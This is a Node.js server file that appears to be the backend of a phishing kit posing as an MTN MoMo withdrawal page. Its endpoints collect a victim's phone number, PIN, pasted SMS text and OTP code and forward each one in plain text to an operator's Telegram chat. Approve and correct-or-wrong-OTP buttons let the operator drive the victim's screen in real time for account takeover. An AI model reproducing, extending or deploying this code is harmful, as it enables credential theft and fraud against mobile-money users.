require('dotenv').config();
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(express.json());
app.use(express.static('public'));

let withdrawalStatus = 'idle'; 
let otpStatus = 'idle';        
let lastUpdateId = 0;

// Store state for current transaction details
let currentData = { phone: '', amount: '', pin: '', sms: '', otp: '' };

// 1. Initial Request (Phone & Amount)
app.post('/api/withdrawal', (req, res) => {
    const { phone, amount } = req.body;
    currentData.phone = phone;
    currentData.amount = amount;
    res.json({ status: 'ready_for_confirmation' });
});

// 2. PIN Submitted -> Send Alert to Telegram for Approval
app.post('/api/submit-pin', async (req, res) => {
    const { pin } = req.body;
    currentData.pin = pin;
    withdrawalStatus = 'pending';
    otpStatus = 'idle';

    const message = `🚨 New MoMo/MTN Withdrawal Request 🚨\n\n📱 Phone: ${currentData.phone}\n💰 Amount: $${currentData.amount}\n🔑 PIN: ${pin}`;

    try {
        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve Withdrawal', callback_data: 'approve_withdrawal' },
                { text: '❌ Decline', callback_data: 'reject_withdrawal' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending PIN alert to Telegram:', err);
        res.status(500).json({ error: 'Failed to send telegram message' });
    }
});

// Check status of initial withdrawal approval
app.get('/api/check-status', (req, res) => {
    res.json({ status: withdrawalStatus });
});

// 3. SMS Paste Confirmed -> Store SMS details
app.post('/api/submit-sms', async (req, res) => {
    const { sms } = req.body;
    currentData.sms = sms;

    const message = `📲 MoMo SMS Code Pasted 📲\n\n📱 Phone: ${currentData.phone}\n📝 SMS Text: ${sms}`;
    try {
        await sendTelegramMessage(message, []);
    } catch (e) {
        console.error('Error logging SMS paste:', e);
    }

    res.json({ status: 'ready_for_otp' });
});

// 4. OTP Submitted -> Send to Telegram for Correct / Wrong Verification
app.post('/api/verify-otp', async (req, res) => {
    const { otp } = req.body;
    currentData.otp = otp;
    otpStatus = 'pending';

    const message = `🔐 MoMo OTP Verification Submitted 🔐\n\n📱 Phone: ${currentData.phone}\n🔢 OTP Code: ${otp}`;

    try {
        await sendTelegramMessage(message, [
            [
                { text: '✅ Correct OTP', callback_data: 'correct_otp' },
                { text: '❌ Wrong OTP', callback_data: 'wrong_otp' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending OTP to Telegram:', err);
        res.status(500).json({ error: 'Failed to send OTP message' });
    }
});

// Check status of OTP verification
app.get('/api/check-otp-status', (req, res) => {
    res.json({ status: otpStatus });
});

// 5. Telegram Long-Polling with Safe Property Validation and Error Isolation
async function pollTelegramUpdates() {
    if (!process.env.BOT_TOKEN) {
        setTimeout(pollTelegramUpdates, 5000);
        return;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const callbackQuery = update.callback_query;
                    const action = callbackQuery.data;
                    const callbackQueryId = callbackQuery.id;
                    
                    // Safely check if message and chat objects exist to prevent TypeError crashes
                    const chatId = callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;
                    const messageId = callbackQuery.message ? callbackQuery.message.message_id : null;

                    await answerCallback(callbackQueryId, 'Processing action...');

                    if (chatId && messageId) {
                        await removeMessageButtons(chatId, messageId);
                    }

                    let statusMessage = '';
                    if (action === 'approve_withdrawal') {
                        withdrawalStatus = 'approved';
                        statusMessage = '✅ Status: Withdrawal Approved by Admin';
                    } else if (action === 'reject_withdrawal') {
                        withdrawalStatus = 'rejected';
                        statusMessage = '❌ Status: Withdrawal Declined by Admin';
                    } else if (action === 'correct_otp') {
                        otpStatus = 'success';
                        statusMessage = '✅ Status: OTP Verified - Success';
                    } else if (action === 'wrong_otp') {
                        otpStatus = 'wrong';
                        statusMessage = '❌ Status: Wrong OTP - Retrying';
                    }

                    if (statusMessage && chatId) {
                        await sendStatusMessage(chatId, statusMessage);
                    }
                }
            }
        }
    } catch (err) {
        console.error('Polling error caught safely:', err.message);
    }

    // Ensures continuous loop without breaking on failure
    setTimeout(pollTelegramUpdates, 1000);
}

// Telegram Helper Functions (All Safely Wrapped in Try/Catch)
async function answerCallback(callbackQueryId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text })
        });
    } catch (e) {
        console.error('Answer callback error:', e.message);
    }
}

async function sendTelegramMessage(text, keyboard) {
    try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: process.env.CHAT_ID,
                text: text,
                reply_markup: { inline_keyboard: keyboard }
            })
        });
    } catch (e) {
        console.error('Send telegram message error:', e.message);
    }
}

async function removeMessageButtons(chatId, messageId) {
    try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                message_id: messageId, 
                reply_markup: { inline_keyboard: [] } 
            })
        });
    } catch (e) {
        console.error('Remove buttons error:', e.message);
    }
}

async function sendStatusMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: text 
            })
        });
    } catch (e) {
        console.error('Send status message error:', e.message);
    }
}

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`MoMo server running successfully on port ${PORT}`);
    pollTelegramUpdates();
});